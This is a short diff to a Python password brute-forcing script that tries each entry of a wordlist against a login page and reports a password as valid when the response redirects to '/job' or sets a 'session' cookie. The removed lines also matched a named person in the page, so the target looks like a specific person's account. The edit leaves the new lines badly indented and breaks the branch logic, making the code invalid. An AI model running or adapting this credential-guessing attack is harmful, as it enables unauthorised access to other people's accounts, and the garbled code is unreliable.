@@ -38,11 +38,10 @@ with open(wordlist) as f:
             print("Cookies:", session.cookies.get_dict())
 
             # সফল লগইন চেক
-            if resp.url.endswith("/job") or "session" in session.cookies.get_dict() or "Jobayer Khan" in resp.text:
-                print(f"[✅] Valid password found: {pwd}")
-                break
-            else:
-                print(f"[-] Invalid: {pwd}")
+            if resp.url.endswith("/job") or "session" in session.cookies.get_dict():
+    print(f"[✅] Valid password found: {pwd}")
+    break
+print(f"[-] Invalid: {pwd}")
                 snippet = resp.text[:300].replace("\n", " ")
                 print("[Snippet]:", snippet[:300])
 
